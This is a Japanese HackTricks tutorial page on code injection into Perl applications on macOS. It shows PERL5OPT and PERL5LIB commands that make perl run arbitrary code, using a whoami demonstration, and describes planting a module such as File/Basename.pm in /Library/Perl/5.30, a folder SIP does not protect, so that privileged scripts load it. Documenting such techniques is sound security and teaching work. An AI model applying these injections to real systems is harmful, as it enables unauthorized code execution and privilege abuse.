# macOS Perlアプリケーションのインジェクション

{% hint style="success" %}
AWSハッキングの学習と練習:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングの学習と練習: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、ハッキングテクニックを共有してください。

</details>
{% endhint %}

## `PERL5OPT` & `PERL5LIB`環境変数を介して

環境変数PERL5OPTを使用すると、perlが任意のコマンドを実行することが可能です。\
例えば、このスクリプトを作成します：

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

今、**環境変数をエクスポート**して、**perl**スクリプトを実行します：
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
別のオプションは、Perlモジュールを作成することです（例：`/tmp/pmod.pm`）：

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

その後、環境変数を使用します：
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## 依存関係を介して

Perlを実行している際に、依存関係フォルダの順序をリストアップすることが可能です：
```bash
perl -e 'print join("\n", @INC)'
```
次のように返されます：
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
いくつかの返されたフォルダは存在しない場合がありますが、**`/Library/Perl/5.30`** は**存在します**。これは**SIP**によって**保護されていません**し、**SIPによって保護されたフォルダよりも前に**あります。したがって、誰かがそのフォルダを悪用してスクリプトの依存関係を追加し、高特権のPerlスクリプトがそれを読み込むことができます。

{% hint style="warning" %}
ただし、そのフォルダに書き込むには**root権限が必要**であり、現在ではこの**TCCプロンプト**が表示されます:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

たとえば、スクリプトが**`use File::Basename;`**をインポートしている場合、`/Library/Perl/5.30/File/Basename.pm`を作成して任意のコードを実行させることが可能です。

## 参考文献

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
